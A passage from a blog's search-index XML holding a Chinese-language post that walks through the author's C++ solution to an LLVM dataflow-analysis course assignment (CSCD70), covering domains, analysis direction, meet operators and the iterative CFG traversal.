<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CSCD70 Assignment2 DataFlow</title>
      <link href="/2023/CSCD70-Assignment2/"/>
      <url>/2023/CSCD70-Assignment2/</url>
      
        <content type="html"><![CDATA[<p>理论部分学习: <a href="https://hanqi-blogs.cn/2023/DataFlow-Analysis">数据流分析笔记</a><br>只展示部分代码,完整代码见github.</p><span id="more"></span><h2 id="数据流分析框架"><a href="#数据流分析框架" class="headerlink" title="数据流分析框架"></a>数据流分析框架</h2><h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><p>设计一个数据流分析框架,需要先清楚数据流分析有哪些部分.</p><!--more--><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312171514663.png"><br>再细分一下就是:<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312171512849.png"></p><h4 id="Domain"><a href="#Domain" class="headerlink" title="Domain"></a>Domain</h4><p>Domain是数据流分析所关心的对象,比如到达定值的对象是定值,活跃变量的对象是变量……</p><p>写好一些常用的分析对象,表达式和变量.<br>一个分析对象应该提供从IR指令中创建的方法和比较相等的方法.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Expression</span> <span class="keyword">final</span> : DomainBase&lt;Expression&gt; {</span><br><span class="line">  <span class="type">const</span> <span class="type">unsigned</span> Opcode;</span><br><span class="line">  <span class="type">const</span> llvm::Value *<span class="type">const</span> LHS = <span class="literal">nullptr</span>, *<span class="type">const</span> RHS = <span class="literal">nullptr</span>;</span><br><span class="line">  <span class="built_in">Expression</span>(<span class="type">const</span> llvm::BinaryOperator &amp;BinaryOp)</span><br><span class="line">      : <span class="built_in">Opcode</span>(BinaryOp.<span class="built_in">getOpcode</span>()), <span class="built_in">LHS</span>(BinaryOp.<span class="built_in">getOperand</span>(<span class="number">0</span>)),</span><br><span class="line">        <span class="built_in">RHS</span>(BinaryOp.<span class="built_in">getOperand</span>(<span class="number">1</span>)) {}</span><br><span class="line">  <span class="built_in">Expression</span>(<span class="type">const</span> <span class="type">unsigned</span> Opcode, <span class="type">const</span> llvm::Value *<span class="type">const</span> LHS,</span><br><span class="line">             <span class="type">const</span> llvm::Value *<span class="type">const</span> RHS)</span><br><span class="line">      : <span class="built_in">Opcode</span>(Opcode), <span class="built_in">LHS</span>(LHS), <span class="built_in">RHS</span>(RHS) {}</span><br><span class="line">  <span class="type">bool</span> <span class="keyword">operator</span>==(<span class="type">const</span> Expression &amp;Other) <span class="type">const</span> <span class="keyword">final</span> {</span><br><span class="line">    <span class="comment">/// @todo(CSCD70) Please complete this method.</span></span><br><span class="line">    <span class="keyword">if</span>(llvm::Instruction::<span class="built_in">isCommutative</span>(Opcode))</span><br><span class="line">    {</span><br><span class="line">      <span class="built_in">return</span> </span><br><span class="line">      ((Opcode == Other.Opcode) &amp;&amp; (LHS == Other.LHS) &amp;&amp; (RHS == Other.RHS)) ||</span><br><span class="line">      ((Opcode == Other.Opcode) &amp;&amp; (LHS == Other.RHS) &amp;&amp; (RHS == Other.LHS));</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">return</span> ((Opcode == Other.Opcode) &amp;&amp; (LHS == Other.LHS) &amp;&amp; (RHS == Other.RHS));</span><br><span class="line"></span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">static</span> Expression <span class="title">ExpressionFromIn</span><span class="params">(<span class="type">const</span> llvm::Instruction&amp; In)</span></span></span><br><span class="line"><span class="function">  </span>{</span><br><span class="line">    <span class="keyword">if</span>(llvm::<span class="built_in">isa</span>&lt;llvm::BinaryOperator&gt;(In))</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">Expression</span>(In.<span class="built_in">getOpcode</span>(),In.<span class="built_in">getOperand</span>(<span class="number">0</span>),In.<span class="built_in">getOperand</span>(<span class="number">1</span>));</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Variable</span> <span class="keyword">final</span> : DomainBase&lt;Variable&gt; {</span><br><span class="line">  <span class="type">const</span> llvm::Value *<span class="type">const</span> Var;</span><br><span class="line">  <span class="built_in">Variable</span>(<span class="type">const</span> llvm::Value *<span class="type">const</span> Var) : <span class="built_in">Var</span>(Var) {}</span><br><span class="line"></span><br><span class="line">  <span class="type">bool</span> <span class="keyword">operator</span>==(<span class="type">const</span> Variable &amp;Other) <span class="type">const</span> { <span class="keyword">return</span> Var == Other.Var; }</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">static</span> Variable <span class="title">VariableFromIn</span><span class="params">(<span class="type">const</span> llvm::Instruction&amp; In)</span></span></span><br><span class="line"><span class="function">  </span>{</span><br><span class="line">    <span class="keyword">if</span>(llvm::<span class="built_in">isa</span>&lt;llvm::Value&gt;(In))</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">Variable</span>(&amp;In);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>在框架中用DomainVector存储分析的Domain,DomainIdMap用来做从对象到索引的转换.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> DomainIdMap_t = std::unordered_map&lt;TDerivedDomainElem, <span class="type">size_t</span>&gt;;</span><br><span class="line"><span class="keyword">using</span> DomainVector_t = std::vector&lt;TDerivedDomainElem&gt;;</span><br><span class="line"></span><br><span class="line">DomainIdMap_t DomainIdMap;</span><br><span class="line">DomainVector_t DomainVector;</span><br></pre></td></tr></tbody></table></figure><p>光存储分析对象没用,还需要存储每条指令对于每个对象的分析结果,BVs是基本块的INPUT(注意是INPUT不是IN,随分析方向不同而含义不同),InstDomainValMap是一条指令的OUTPUT(同上).<br>两者合起来就有了对每条指令完整的IN,OUT(基本块的INPUT同时也是基本块第一条指令的INPUT).</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">std::unordered_map&lt;<span class="type">const</span> llvm::BasicBlock *, DomainVal_t&gt; BVs;</span><br><span class="line">std::unordered_map&lt;<span class="type">const</span> llvm::Instruction *, DomainVal_t&gt; InstDomainValMap;</span><br></pre></td></tr></tbody></table></figure><p>以及对单个分析对象的分析结果表示</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// @brief For each domain element type, we have to define:</span></span><br><span class="line"><span class="comment">///        - The default constructor</span></span><br><span class="line"><span class="comment">///        - The meet operators (for intersect/union)</span></span><br><span class="line"><span class="comment">///        - The top element</span></span><br><span class="line"><span class="comment">///        - Conversion to bool (for logging)</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Bool</span> {</span><br><span class="line">  <span class="type">bool</span> Value = <span class="literal">false</span>;</span><br><span class="line">  Bool <span class="keyword">operator</span>&amp;(<span class="type">const</span> Bool &amp;Other) <span class="type">const</span> {</span><br><span class="line">    <span class="keyword">return</span> {.Value = Value &amp;&amp; Other.Value};</span><br><span class="line">  }</span><br><span class="line">  Bool <span class="keyword">operator</span>|(<span class="type">const</span> Bool &amp;Other) <span class="type">const</span> {</span><br><span class="line">    <span class="keyword">return</span> {.Value = Value || Other.Value};</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">static</span> Bool <span class="title">top</span><span class="params">()</span> </span>{ <span class="keyword">return</span> {.Value = <span class="literal">true</span>}; }</span><br><span class="line">  <span class="function"><span class="keyword">operator</span> <span class="title">bool</span><span class="params">()</span> <span class="type">const</span> </span>{ <span class="keyword">return</span> Value; }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="Direction"><a href="#Direction" class="headerlink" title="Direction"></a>Direction</h4><p>分析方向体现在遍历指令的顺序和获取MeetOperands的操作上.<br>Forward:</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">virtual</span> MeetOperands_t <span class="title">getMeetOperands</span><span class="params">(<span class="type">const</span> llvm::BasicBlock &amp;BB)</span> <span class="type">const</span> </span>{</span><br><span class="line">    MeetOperands_t Operands;</span><br><span class="line">    <span class="comment">/// @todo(CSCD70) Please complete this method.</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">const</span> llvm::BasicBlock* preBB : <span class="built_in">getMeetBBConstRange</span>(BB))</span><br><span class="line">    {</span><br><span class="line">      DomainVal_t domain = InstDomainValMap.<span class="built_in">at</span>(&amp;(preBB-&gt;<span class="built_in">back</span>()));</span><br><span class="line">      Operands.<span class="built_in">push_back</span>(domain);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> Operands;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="function">MeetBBConstRange_t</span></span><br><span class="line"><span class="function">  <span class="title">getMeetBBConstRange</span><span class="params">(<span class="type">const</span> llvm::BasicBlock &amp;BB)</span> <span class="type">const</span> <span class="keyword">final</span> </span>{</span><br><span class="line">    <span class="keyword">return</span> llvm::<span class="built_in">predecessors</span>(&amp;BB);</span><br><span class="line">  }</span><br><span class="line">  <span class="function">InstConstRange_t <span class="title">getInstConstRange</span><span class="params">(<span class="type">const</span> llvm::BasicBlock &amp;BB)</span> <span class="type">const</span> <span class="keyword">final</span> </span>{</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">make_range</span>(BB.<span class="built_in">begin</span>(), BB.<span class="built_in">end</span>());</span><br><span class="line">  }</span><br><span class="line">  <span class="function">BBConstRange_t <span class="title">getBBConstRange</span><span class="params">(<span class="type">const</span> llvm::Function &amp;F)</span> <span class="type">const</span> <span class="keyword">final</span> </span>{</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">make_range</span>(F.<span class="built_in">begin</span>(), F.<span class="built_in">end</span>());</span><br><span class="line">  }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>Backward:</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">virtual</span> MeetOperands_t <span class="title">getMeetOperands</span><span class="params">(<span class="type">const</span> llvm::BasicBlock &amp;BB)</span> <span class="type">const</span> </span>{</span><br><span class="line">    MeetOperands_t Operands;</span><br><span class="line">    <span class="comment">/// @todo(CSCD70) Please complete this method.</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">const</span> llvm::BasicBlock* preBB : <span class="built_in">getMeetBBConstRange</span>(BB))</span><br><span class="line">    {</span><br><span class="line">      DomainVal_t domain = InstDomainValMap.<span class="built_in">at</span>(&amp;(preBB-&gt;<span class="built_in">front</span>()));</span><br><span class="line">      Operands.<span class="built_in">push_back</span>(domain);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> Operands;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="function">MeetBBConstRange_t</span></span><br><span class="line"><span class="function">  <span class="title">getMeetBBConstRange</span><span class="params">(<span class="type">const</span> llvm::BasicBlock &amp;BB)</span> <span class="type">const</span> <span class="keyword">final</span> </span>{</span><br><span class="line">    <span class="keyword">return</span> llvm::<span class="built_in">successors</span>(&amp;BB);</span><br><span class="line">  }</span><br><span class="line">  <span class="function">InstConstRange_t <span class="title">getInstConstRange</span><span class="params">(<span class="type">const</span> llvm::BasicBlock &amp;BB)</span> <span class="type">const</span> <span class="keyword">final</span> </span>{</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">make_range</span>(BB.<span class="built_in">rbegin</span>(), BB.<span class="built_in">rend</span>());</span><br><span class="line">  }</span><br><span class="line">  <span class="function">BBConstRange_t <span class="title">getBBConstRange</span><span class="params">(<span class="type">const</span> llvm::Function &amp;F)</span> <span class="type">const</span> <span class="keyword">final</span> </span>{</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">make_range</span>(F.<span class="built_in">rbegin</span>(), F.<span class="built_in">rend</span>());</span><br><span class="line">  }</span><br><span class="line">};</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>对于Backward的分析,<br>llvm-16没有提供逆序遍历Function中Basic Block的接口,我给它加上了,感觉没什么理由不加这个接口.<br>其实之前版本(比如llvm-14)中也没有在Function类中提供这个接口,不过其的getBasicBlockList是public的,用户以F.getBasicBlockList().rbegin()的形式来实现backward的迭代.感觉像是改了访问属性但忘了加另外的接口.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//===--------------------------------------------------------------------===//</span></span><br><span class="line"><span class="comment">// BasicBlock iterator forwarding functions</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function">iterator                <span class="title">begin</span><span class="params">()</span>       </span>{ <span class="keyword">return</span> BasicBlocks.<span class="built_in">begin</span>(); }</span><br><span class="line"><span class="function">const_iterator          <span class="title">begin</span><span class="params">()</span> <span class="type">const</span> </span>{ <span class="keyword">return</span> BasicBlocks.<span class="built_in">begin</span>(); }</span><br><span class="line"><span class="function">iterator                <span class="title">end</span>  <span class="params">()</span>       </span>{ <span class="keyword">return</span> BasicBlocks.<span class="built_in">end</span>();   }</span><br><span class="line"><span class="function">const_iterator          <span class="title">end</span>  <span class="params">()</span> <span class="type">const</span> </span>{ <span class="keyword">return</span> BasicBlocks.<span class="built_in">end</span>();   }</span><br><span class="line"></span><br><span class="line"><span class="comment">//===--------------------------------------------------------------------===//</span></span><br><span class="line"><span class="comment">// BasicBlock iterator backwarding functions</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function">reverse_iterator        <span class="title">rbegin</span><span class="params">()</span>       </span>{ <span class="keyword">return</span> BasicBlocks.<span class="built_in">rbegin</span>(); }</span><br><span class="line"><span class="function">const_reverse_iterator  <span class="title">rbegin</span><span class="params">()</span> <span class="type">const</span> </span>{ <span class="keyword">return</span> BasicBlocks.<span class="built_in">rbegin</span>(); }</span><br><span class="line"><span class="function">reverse_iterator        <span class="title">rend</span>  <span class="params">()</span>       </span>{ <span class="keyword">return</span> BasicBlocks.<span class="built_in">rend</span>();   }</span><br><span class="line"><span class="function">const_reverse_iterator  <span class="title">rend</span>  <span class="params">()</span> <span class="type">const</span> </span>{ <span class="keyword">return</span> BasicBlocks.<span class="built_in">rend</span>();   }</span><br></pre></td></tr></tbody></table></figure><p>这是llvm对修改访问属性原因的描述:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/// This is deliberately private because we have implemented an adequate set</span><br><span class="line">/// of functions to modify the list, including Function::splice(),</span><br><span class="line">/// Function::erase(), Function::insert() etc.</span><br></pre></td></tr></tbody></table></figure><h4 id="Meet-Operator-Initial-Condition"><a href="#Meet-Operator-Initial-Condition" class="headerlink" title="Meet Operator , Initial Condition"></a>Meet Operator , Initial Condition</h4><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> TValue&gt; <span class="keyword">struct</span> <span class="title class_">Intersect</span> <span class="keyword">final</span> : MeetOpBase&lt;TValue&gt; {</span><br><span class="line">  <span class="keyword">using</span> DomainVal_t = <span class="keyword">typename</span> MeetOpBase&lt;TValue&gt;::DomainVal_t;</span><br><span class="line"></span><br><span class="line">  <span class="function">DomainVal_t <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">const</span> DomainVal_t &amp;LHS,</span></span></span><br><span class="line"><span class="params"><span class="function">                         <span class="type">const</span> DomainVal_t &amp;RHS)</span> <span class="type">const</span> <span class="keyword">final</span> </span>{</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// @todo(CSCD70) Please complete this method.</span></span><br><span class="line">    DomainVal_t result = (*<span class="keyword">this</span>).<span class="built_in">top</span>(LHS.<span class="built_in">size</span>());</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; LHS.<span class="built_in">size</span>();++i)</span><br><span class="line">    {</span><br><span class="line">      result[i] = LHS[i] &amp; RHS[i];</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  }</span><br><span class="line">  <span class="function">DomainVal_t <span class="title">top</span><span class="params">(<span class="type">const</span> std::<span class="type">size_t</span> DomainSize)</span> <span class="type">const</span> <span class="keyword">final</span> </span>{</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// @todo(CSCD70) Please complete this method.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">DomainVal_t</span>(DomainSize,TValue::<span class="built_in">top</span>());</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/// @todo(CSCD70) Please add another subclass for the Union meet operator.</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> TValue&gt; <span class="keyword">struct</span> <span class="title class_">Unite</span> <span class="keyword">final</span> : MeetOpBase&lt;TValue&gt; {</span><br><span class="line">  <span class="keyword">using</span> DomainVal_t = <span class="keyword">typename</span> MeetOpBase&lt;TValue&gt;::DomainVal_t;</span><br><span class="line"></span><br><span class="line">  <span class="function">DomainVal_t <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">const</span> DomainVal_t &amp;LHS,</span></span></span><br><span class="line"><span class="params"><span class="function">                         <span class="type">const</span> DomainVal_t &amp;RHS)</span> <span class="type">const</span> <span class="keyword">final</span> </span>{</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// @todo(CSCD70) Please complete this method.</span></span><br><span class="line">    DomainVal_t result = (*<span class="keyword">this</span>).<span class="built_in">top</span>(LHS.<span class="built_in">size</span>());</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; LHS.<span class="built_in">size</span>();++i)</span><br><span class="line">    {</span><br><span class="line">      result[i] = LHS[i] | RHS[i];</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  }</span><br><span class="line">  <span class="function">DomainVal_t <span class="title">top</span><span class="params">(<span class="type">const</span> std::<span class="type">size_t</span> DomainSize)</span> <span class="type">const</span> <span class="keyword">final</span> </span>{</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// @todo(CSCD70) Please complete this method.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">DomainVal_t</span>(DomainSize,<span class="built_in">TValue</span>());</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>从注释来看top是用来初始化,那么就应该是DomainVal_t的初始值,且该函数要求派生类重载,意味着这一”top”的概念在交集和并集中不同,应该就是代表数据流分析的Initial condition.这一点与南京大学的软件分析课程有点冲突.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/// @brief Return a domain value that represents the top element, used when</span></span><br><span class="line">  <span class="comment">///        doing the initialization.</span></span><br><span class="line">  <span class="comment">/// @param DomainSize</span></span><br><span class="line">  <span class="comment">/// @return</span></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> DomainVal_t <span class="title">top</span><span class="params">(<span class="type">const</span> std::<span class="type">size_t</span> DomainSize)</span> <span class="type">const</span> </span>= <span class="number">0</span>;</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>先遍历一次所有指令,从指令中得到分析的Domain.再遍历一次进行初始化对BVs和InstDomainValMap进行初始化,因为它们即将作为分析的INPUT.</p><p>然后便开始一轮一轮的分析traverseCFG,直到连续两轮结果相同为止,最后输出结果.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">virtual</span> AnalysisResult_t <span class="title">run</span><span class="params">(llvm::Function &amp;F,</span></span></span><br><span class="line"><span class="params"><span class="function">                             llvm::FunctionAnalysisManager &amp;FAM)</span> </span>{</span><br><span class="line"></span><br><span class="line">  <span class="comment">/// @todo(CSCD70) Please complete this method.</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; In : <span class="built_in">instructions</span>(F))</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">InitializeDomainFromInstruction</span>(In);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; BB : <span class="built_in">getBBConstRange</span>(F))</span><br><span class="line">  {</span><br><span class="line">    BVs[&amp;BB] = <span class="built_in">TMeetOp</span>().<span class="built_in">top</span>(DomainIdMap.<span class="built_in">size</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; In : <span class="built_in">getInstConstRange</span>(BB))</span><br><span class="line">    {</span><br><span class="line">      InstDomainValMap[&amp;In] = <span class="built_in">TMeetOp</span>().<span class="built_in">top</span>(DomainIdMap.<span class="built_in">size</span>());</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(<span class="built_in">traverseCFG</span>(F));</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printInstDomainValMap</span>(F);</span><br><span class="line">  <span class="keyword">return</span> std::<span class="built_in">make_tuple</span>(DomainIdMap, DomainVector, BVs, InstDomainValMap);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>对每一个基本块,首先通过getBoundaryVal获取所有INPUT的Meet来作为该块的INPUT,而对于其他指令,就取上一条指令的OUTPUT进行transferFunc就行.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// @brief Traverse through the CFG of the function.</span></span><br><span class="line"><span class="comment">/// @param F</span></span><br><span class="line"><span class="comment">/// @return True if either BasicBlock-DomainValue mapping or</span></span><br><span class="line"><span class="comment">///         Instruction-DomainValue mapping has been modified, false</span></span><br><span class="line"><span class="comment">///         otherwise.</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">traverseCFG</span><span class="params">(<span class="type">const</span> llvm::Function &amp;F)</span> </span>{</span><br><span class="line">  <span class="type">bool</span> Changed = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/// @todo(CSCD70) Please complete this method.</span></span><br><span class="line">  <span class="comment">//在Froward和Backward的分析中,IDV,ODV的意义相反</span></span><br><span class="line">  DomainVal_t IDV,ODV;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; BB : <span class="built_in">getBBConstRange</span>(F))</span><br><span class="line">  {</span><br><span class="line">    IDV = <span class="built_in">getBoundaryVal</span>(BB);</span><br><span class="line">    BVs[&amp;BB] = IDV; </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; In : <span class="built_in">getInstConstRange</span>(BB))</span><br><span class="line">    {</span><br><span class="line">      ODV = InstDomainValMap[&amp;In];</span><br><span class="line">      Changed |= <span class="built_in">transferFunc</span>(In,IDV,ODV);</span><br><span class="line">      InstDomainValMap[&amp;In] = ODV;</span><br><span class="line">      IDV = ODV;</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> Changed;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这里还有一个特殊的处理,对于分析的Boudary Condition,通过其的MeetOperands为空识别出来,再将其初始化为之前预设的bc就行.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DomainVal_t <span class="title">getBoundaryVal</span><span class="params">(<span class="type">const</span> llvm::BasicBlock &amp;BB)</span> <span class="type">const</span> </span>{</span><br><span class="line">  MeetOperands_t MeetOperands = <span class="built_in">getMeetOperands</span>(BB);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/// @todo(CSCD70) Please complete this method.</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//对于Boudary Condition,没有前驱块</span></span><br><span class="line">  